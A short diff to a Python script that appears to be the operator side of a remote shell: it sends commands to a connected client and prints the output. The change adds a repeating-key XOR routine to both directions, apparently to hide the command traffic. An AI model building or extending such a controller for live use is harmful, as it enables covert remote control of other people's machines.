@@ -29,6 +29,14 @@ current_session = ""
 
 RUNNING = True
 
+def crypt(data, key):
+	out = bytearray()
+
+	for i in range(0, len(data)):
+		out.append(data[i] ^ key[i % len(key)])
+
+	return bytes(out)
+
 def check_magic(data):
 	return data == MAGIC
 
@@ -54,7 +62,7 @@ def handle_client(connection):
 			break
 
 		try:
-			connection.send(cmd.encode("utf-8") + bytes([0]))
+			connection.send(crypt(cmd.encode("utf-8") + bytes([0]), KEY))
 
 			if _CD_LOCK:
 				_CD_LOCK = False
@@ -75,6 +83,9 @@ def handle_client(connection):
 			break
 
 		d = connection.recv(4096)
+
+		d = crypt(d, KEY)
+
 		print(d.decode("utf-8"), end="")
 
 		if not _CD_LOCK:
